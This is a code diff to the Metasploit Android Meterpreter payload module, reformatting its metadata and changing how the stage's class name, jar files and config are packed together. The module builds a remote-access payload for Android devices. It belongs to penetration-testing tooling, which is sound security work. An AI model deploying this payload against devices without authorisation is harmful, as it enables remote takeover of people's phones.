@@ -15,20 +15,16 @@ module Metasploit4
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'      => 'Android Meterpreter',
+      'Name'        => 'Android Meterpreter',
       'Description' => 'Run a meterpreter server on Android',
-      'Author'    => [
-          'mihi', # all the hard work
-          'egypt', # msf integration
-          'anwarelmakrahy' # android extension
-        ],
+      'Author'      => ['mihi', 'egypt', 'anwarelmakrahy', 'OJ Reeves'],
       'Platform'    => 'android',
-      'Arch'      => ARCH_DALVIK,
-      'License'   => MSF_LICENSE,
-      'Session'   => Msf::Sessions::Meterpreter_Java_Android))
+      'Arch'        => ARCH_DALVIK,
+      'License'     => MSF_LICENSE,
+      'Session'     => Msf::Sessions::Meterpreter_Java_Android
+    ))
 
-    register_options(
-    [
+    register_options([
       OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
     ], self.class)
   end
@@ -38,14 +34,20 @@ module Metasploit4
   # used as the final stage
   #
   def generate_stage(opts={})
-    # TODO: wire the UUID into the stage
     clazz = 'androidpayload.stage.Meterpreter'
     metstage = MetasploitPayloads.read("android", "metstage.jar")
     met = MetasploitPayloads.read("android", "meterpreter.jar")
 
     # Name of the class to load from the stage, the actual jar to load
     # it from, and then finally the meterpreter stage
-    java_string(clazz) + java_string(metstage) + java_string(met) + java_string(generate_config(opts))
+    blocks = [
+      java_string(clazz),
+      java_string(metstage),
+      java_string(met),
+      java_string(generate_config(opts))
+    ]
+
+    (blocks + [blocks.length]).pack('A*' * blocks.length + 'N')
   end
 
   def generate_config(opts={})
